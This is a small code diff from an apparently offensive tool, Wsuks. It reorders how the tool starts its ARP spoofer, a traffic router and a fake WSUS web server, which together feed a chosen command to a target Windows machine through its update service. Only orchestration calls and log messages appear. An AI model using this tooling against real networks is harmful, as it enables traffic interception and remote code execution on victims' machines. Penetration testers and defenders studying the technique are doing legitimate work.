@@ -93,6 +93,9 @@ class Wsuks:
         self.logger.success(f"Command to execute: \n{highlight(self.executable_name, 'yellow')} {highlight(self.command, 'yellow')}")
 
     def run(self):
+        arpspoofer = ArpSpoofer(self.interface)
+        router = Router(self.targetIp, self.hostIp, self.wsusIp, self.wsusPort, self.interface)
+
         if not self.args.serve_only:
             # Get the WSUS server IP and Port from the sysvol share
             sysvolparser = SysvolParser()
@@ -113,15 +116,13 @@ class Wsuks:
             else:
                 self.wsusPort = int(self.wsusPort)
 
-            self.logger.info("===== Setup done, starting services =====")
+            self.logger.info("===== Setup done, starting ARP spoofer and routing =====")
             # Start Arp Spoofing
-            arpspoofer = ArpSpoofer(self.interface)
             arpspoofer.start(self.targetIp, self.wsusIp)
-
             # Set up routing to route spoofed packages to the local HTTP server
-            router = Router(self.targetIp, self.hostIp, self.wsusIp, self.wsusPort, self.interface)
             router.start()
 
+        self.logger.info("===== Starting Web Server =====")
         # Prepare WSUS HTTP Server
         # If we have a TLS cert we have to switch to HTTPS and supply the DNS name
         if self.args.tlsCert:  # noqa: SIM108
